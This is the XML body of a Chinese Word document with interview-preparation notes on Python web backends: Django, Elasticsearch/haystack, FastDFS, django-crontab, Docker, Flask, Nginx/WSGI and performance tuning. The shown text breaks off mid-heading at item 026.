    <w:p w14:paraId="36493547" w14:textId="72B3032E" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>$("#id").attr(“value”)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318DBB56" w14:textId="53B03570" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A2037A"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014</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shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2558A437" w14:textId="77777777" w:rsidR="00A63022" w:rsidRPr="001D56F9" w:rsidRDefault="00A63022" w:rsidP="001D56F9">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D56F9">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的manage工具提供了shell命令，帮助我们配置好当前工程的运行环境（如连接好数据库等），以便可以直接在终端中执行测试python语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A0A0E1" w14:textId="674DA895" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A2037A"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015</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es</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>搜索引擎</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3148BBD8"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Elasticsearch(</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简称</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidRPr="00A2037A">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)是java语言实现的一个开源的搜索引擎，是目前全文检索的首选。通过搜索引擎进行数据查询时，搜索引擎并不是直接在数据库中进行查询，而是会对数据库中的数据进行一遍预处理，单独建立起一份索引结构数据。在通过搜索引擎搜索时，搜索引擎将关键字在索引数据中进行快速对比查找，进而找到数据的真实存储位置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19022511"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分布式实时文件存储，并将每一个字段都编入索引，使其可以被搜索。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B080D8"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可实现亿级数据实时查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C6699E"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实时分析的分布式搜索引擎。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5B1AB8" w14:textId="3C4B88A8"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可以扩展到上百台服务器，处理PB级别的结构化或非结构化数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D2676E"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在项目里，使用Docker搭建es搜索引擎服务器并使用haystack对接es搜索引擎来实现商品的搜索功能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181CE91A" w14:textId="2ECE9FBA"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haystack 全文检索不同于特定字段的模糊查询，使用全文检索的效率更高，并且能够对于中文进行分词处理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2740E284" w14:textId="0C9C47FD" w:rsidR="00A63022" w:rsidRDefault="00A2037A" w:rsidP="00A63022">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rStyle w:val="a9"/>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>016</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fastdf</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>分布式文件系统</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67ABC736"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包括tracker和storage。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28273F46" w14:textId="4406417A"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FastDFS 架构包括 Tracker server 和 Storage server。客户端请求 Tracker server 进行文 件上传、下载，通过 Tracker server 调度最终由 Storage server 完成文件上传和下载。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B31615"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有个sdk文件，然后import导入，后面再用request.files.get(’’).read()得到上传的图片，调用里面的方法，里面有put_file方法将图片文件上传到fastdf里面</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6562D933" w14:textId="74DED892" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00A2037A"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017</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定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6244EEEE"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安装</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF16FF9"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pip install django-crontab</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="679DA374"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添加应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAF85F9"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INSTALLED_APPS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764E501A"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lastRenderedPageBreak/>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5826E3CA"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‘django_crontab’, # 定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5019A9"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E3F604"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C3374DD" w14:textId="17F53AF8"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设置任务的定时时间</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D16F502"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可以在文件夹里面看到这些文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1140031B"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开启定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A16FCA0"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添加定时任务到系统中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498E9AC9"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python manage.py crontab add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7ED1DC"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显示已经激活的定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B7AEA1F"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python manage.py crontab show</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D454542"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移除定时任务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74C24CCD" w14:textId="557464A1"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python manage.py crontab remove</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D095712" w14:textId="5030482C" w:rsidR="00A63022" w:rsidRPr="00A63022" w:rsidRDefault="00412F97" w:rsidP="00A63022">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018</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>docker</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00A63022">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>你用的挺熟的嘛</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5E3E75"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docker的话一般提起来都喜欢和虚拟机联系起来，提起docker的话，我脑海里有3个关键字，就是镜像、容器、仓库，就是它会把一些镜像在虚拟机里运作起来，那么它就是一个容器。为什么说它是一个仓库呢，就是它负责管理存储这些镜像文件。然后docker它有一个很大的好处就是，对于我们开发人员来说，这个代码在我这里能跑，但是在运维那里就跑不了，然后运维就说你的代码有问题，但是再试的话就又能跑了，没有问题。但是我们用了docker的话就不会出现这种问题，因为它的环境是一样的。所以运维也蛮喜欢用这个的，因为说用docker的话它会把你的运行程序隔离起来，就不会有影响。它是用go写的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C8EDE15" w14:textId="680AE105" w:rsidR="00A63022" w:rsidRDefault="00412F97" w:rsidP="00EF28F6">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:color w:val="4D4D4D"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>019</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保持状态</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>，一个网页到另外一个网页，就比如说从</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>qq</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>空间到邮箱，都是登录的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FEA7B5C"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在登录之前给个校验，如果检验通过的话，就登录。。。？(未完待续)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518B46F2" w14:textId="5DF4108B" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00412F97" w:rsidP="00EF28F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020</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flask</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>有什么区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672D998A"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个人更倾向flask，因为它更方便，更灵活，用什么就装什么。不想django那样，都放在那里。就好比你买辆车吧，django就是什么车胎发动机都给你定下来装好了，而flask的话我可以改改发动机呀改改轮胎呀什么的，根据个人的需求来定制化操作。flask更轻便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6824FD" w14:textId="25FFFF09" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00412F97" w:rsidP="00EF28F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021</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dumps</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>loads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41770422"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项目接口里用到</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="592DAB84"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dumps:将dict（字典）转换为str（字符串）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455FE04A" w14:textId="0DE65A95"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loads:用于将str（字符串）转换为dict（字典）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2C63AF" w14:textId="0ED97863" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00412F97" w:rsidP="00EF28F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022</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用过的算法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63F8DA28"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SHA-1（项目里jwt用的）、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B917D17" w14:textId="0EF1B158" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00412F97" w:rsidP="00EF28F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024</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Django</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>框架优化？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B1F321" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00A2037A" w:rsidDel="001B46D3"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del w:id="762" w:author="ABM ABM" w:date="2020-10-05T00:05:00Z"/>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lastRenderedPageBreak/>
        <w:t>对一个后端开发程序员来说，提升性能指标主要有两个一个是并发数，另一个是响应时间网站性能的优化一般包括 web 前端性能优化，应用服务器性能优化，存储服务器优化。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1809DE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="001B46D3"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hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="763" w:author="ABM ABM" w:date="2020-10-05T00:05:00Z">
            <w:rPr>
              <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
              <w:color w:val="000000"/>
              <w:kern w:val="0"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
      </w:pPr>
      <w:del w:id="764" w:author="ABM ABM" w:date="2020-10-05T00:05:00Z">
        <w:r w:rsidRPr="00A2037A" w:rsidDel="001B46D3">
          <w:rPr>
            <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
            <w:color w:val="000000"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>​</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1661FB7F"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对前端的优化主要有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9E58B1"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1.减少 http 请求，减少数据库的访问量，比如使用雪碧图。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C26DDFF"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2.使用浏览器缓存，将一些常用的 css，js，logo 图标，这些静态资源缓存到本地浏览器，通过设置 http 头中的 cache-control 和 expires 的属性，可设定浏览器缓存，缓存时间可以自定义。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CCA30BF"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3 对 html，css，javascript 文件进行压缩，减少网络的通信量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7171860F"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MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>​</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC12C86"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对我个人而言，我做的优化主要是以下三个方面：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B0B144"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1.合理的使用缓存技术，对一些常用到的动态数据，比如首页做一个缓存，或者某些常用的数据做个缓存，设置一定得过期时间，这样减少了对数据库的压力，提升网站性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2875ABE7"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2.使用 celery 消息队列，将耗时的操作扔到队列里，让 worker 去监听队列里的任务，实现异步操作，比如发邮件，发短信。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F27887C"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3.就是代码上的一些优化，补充：nginx 部署项目也是项目优化，可以配置合适的配置参数，提升效率，增加并发量。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED26374"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4.如果太多考虑安全因素，服务器磁盘用固态硬盘读写，远远大于机械硬盘，这个技术现在没有普及，主要是固态硬盘技术上还不是完全成熟， 相信以后会大量普及。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F73032"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5.另外还可以搭建服务器集群，将并发访问请求，分散到多台服务器上处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3778AB9B" w14:textId="483E3800"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6.最后就是运维工作人员的一些性能优化技术了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B5C2164"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其他版本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D125016"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首先，我会从代码这块着手。用debug调试，到前端页面，按f12,看看模块的使用是不是合理，不合理的话就修改下代码。相对来说，改后端代码是比较简单的操作。如果一切都没没问的话，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BEFE42"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其次呢，我就会考虑从数据库这块优化。比方说sql语句，分析下慢查询，看看语句的耗时是否合理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0879C921" w14:textId="4297485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最后呢，才会考虑一些部署问题，比方说搭建集群，nginx反向代理，数据库主从同步读写分离，使用就缓存技术等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="015C275B" w14:textId="1037CF6A" w:rsidR="00EF28F6" w:rsidRPr="00EF28F6" w:rsidRDefault="00412F97" w:rsidP="00EF28F6">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Pr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>25</w:t>
      </w:r>
      <w:ins w:id="765" w:author="ABM ABM" w:date="2020-10-05T00:05:00Z">
        <w:r w:rsidR="001B46D3">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>、</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="766" w:author="ABM ABM" w:date="2020-10-05T00:05:00Z">
        <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidDel="001B46D3">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nginx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AECE6A0"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Nginx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="229653B3"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采用 C 语言编写</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4325BB9F" w14:textId="5D58613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实现分流、转发、负载均衡</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6709FB65"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服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199BAB4A" w14:textId="7C15AFE6"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WSGI（Web Server Gateway Interface），翻译为Python web服务器网关接口，即Python的Web应用程序（如Flask）和Web服务器(如Nginx)之间的一种通信协议。也就是说，如果让你的Web应用在任何服务器上运行，就必须遵循这个协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0406F846"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那么实现WSGI协议的web服务器有哪些呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6F465C"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就比如uWSGI与gunicorn。两者都可以作为Web服务器。可能你在许多地方看到的都是采用Nginx + uWSGI（或gunicorn）的部署方式。实际上，直接通过uWSGI或gunicorn直接部署也是可以让外网访问的，那你可能会说，那要Nginx何用？别急，那么接来下介绍另一个Web服务器——Nginx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EB025A"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Nginx作为一个高性能Web服务器，具有负载均衡、拦截静态请求、高并发…等等许多功能，你可能要问了，这些功能和使用Nginx + WSGI容器的部署方式有什么关系？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C602C0"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lastRenderedPageBreak/>
        <w:t>首先是负载均衡，如果你了解过OSI模型的话，其实负载均衡器就是该模型中4~7层交换机中的一种，它的作用是能够仅通过一个前端唯一的URL访问分发到后台的多个服务器，这对于并发量非常大的企业级Web站点非常有效。在实际应用中我们通常会让Nginx监听（绑定）80端口，通过多域名或者多个location分发到不同的后端应用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5264413D"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其次是拦截静态请求，简单来说，Nginx会拦截到静态请求（静态文件，如图片），并交给自己处理。而动态请求内容将会通过WSGI容器交给Web应用处理;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B27918E"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Nginx还有其他很多的功能，这里便不一一介绍。那么前面说了，直接通过uWSGI或gunicorn也可以让外网访问到的，但是鉴于Nginx具有高性能、高并发、静态文件缓存、及以上两点、甚至还可以做到限流与访问控制，所以选择Nginx是很有必要的；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6807F0F7"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这里可以说明，如果你选择的架构是：Nginx + WSGI容器 + web应用，WSGI容器相当于一个中间件；如果选择的架构是uWSGI + web应用，WSGI容器则为一个web服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B421A7" w14:textId="127D17BA" w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidRDefault="00D46807" w:rsidP="00EF28F6">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="98D5E5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="767" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>0</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>26</w:t>
      </w:r>
      <w:ins w:id="768" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:t>、</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="769" w:author="ABM ABM" w:date="2020-10-05T00:06:00Z">
        <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6" w:rsidDel="00D46807">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="FFFFFF"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>说说</w:t>
      </w:r>
      <w:r w:rsidR="00A63022" w:rsidRPr="00EF28F6">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
